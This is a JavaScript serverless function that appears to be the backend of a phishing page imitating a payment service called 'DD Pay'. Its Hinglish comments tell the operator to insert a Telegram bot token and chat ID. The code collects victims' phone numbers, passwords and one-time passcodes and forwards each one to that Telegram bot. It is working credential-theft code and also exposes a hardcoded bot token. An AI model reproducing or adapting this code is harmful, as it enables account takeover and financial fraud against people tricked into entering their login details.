module.exports = async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    // 🔴 YAHAN APNA TELEGRAM BOT TOKEN AUR CHAT ID DAALEIN:
    const BOT_TOKEN = '8855125702:AAF-zPN8fj-o43LrpltfZwvxhYvTnC1PHdE'; 
    const CHAT_ID = '8989387207';

    try {
        const { phone, pass, otp, type } = req.body;
        let message = '';

        if (type === 'login') {
            if (!phone || !pass) {
                return res.status(400).json({ error: 'Phone and password are required' });
            }
            message = `🚨 *New DD Pay Login* 🚨\n\n📞 Phone: \`${phone}\`\n🔑 Password: \`${pass}\``;
        } 
        else if (type === 'send_otp') {
            message = `📩 *OTP Requested*\n\n📞 Phone: \`${phone}\``;
        } 
        else if (type === 'verify_otp') {
            if (!otp) {
                return res.status(400).json({ error: 'OTP is required' });
            }
            message = `🔐 *Entered OTP*\n\n📞 Phone: \`${phone}\`\n🔢 OTP: \`${otp}\``;
        } else {
            return res.status(400).json({ error: 'Invalid request type' });
        }

        // Telegram Bot ko message bhejne ka code
        if (BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && CHAT_ID !== 'YOUR_CHAT_ID_HERE') {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }

        return res.status(200).json({ 
            success: true, 
            message: 'Processed successfully' 
        });

    } catch (error) {
        console.error('Server Error:', error);
        return res.status(500).json({ error: 'Internal Server Error' });
    }
};
